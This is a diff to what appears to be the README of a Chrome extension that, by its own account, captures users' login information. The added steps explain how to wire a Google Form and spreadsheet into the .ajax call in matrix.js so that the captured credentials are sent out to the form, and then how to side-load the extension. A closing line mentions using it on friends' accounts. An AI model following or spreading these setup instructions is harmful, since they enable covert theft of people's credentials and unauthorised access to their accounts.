@@ -28,9 +28,19 @@ Use The Data In Any Way We See Fit:
 In other words, other than changing words/letters/phrases depending on what you put into the popup, we can steal your login information and login into websites because you allowed us to.
 
 # Want to know how to make it yours?
-1. You need to make a google form and link it to a google spreadsheet
-2. Have three short answer response questions
-3. Right click the first input text box and go to inspect element
+1. You need to make a google form and link it to a google spreadsheet.
+2. Have three short answer response questions.
+3. Right click the first input text box and go to inspect element.
 4. Find the name of the input text field (i.e. entry.00000101).
-5. Copy the whole name and go to matrix.js (Assuming you have it downloaded)
-6. 
+5. Copy the whole name and go to matrix.js (Assuming you have everything downloaded).
+6. Find the .ajax and input the name into its respected field underneath the comment (comments look like this //).
+7. Repeat Steps 3-6 two more times to copy and paste the 2nd and 3rd input fields into matrix.js.
+8. Fill out your google form and wait for the "Your Response Has Been Submitted".
+9. Copy the URL and go back to the .ajax inside matrix.js and change the current url to that.
+10. Save all files that you editied.
+11. Go to chrome://extensions/.
+12. Turn on developer mode.
+13. Click Load Unpacked Extensions and navigate to the folder that all the extension files are in.
+14. If there are erros, figure it out and try again. Otherwise it should be enabled once you press 'OK'.
+15. Don't be stupid and destroy your friend's or your accounts: It will be very tempting. 
+16. Lastly, this will not work on every website (i.e. Github). We are still troubleshooting this. 
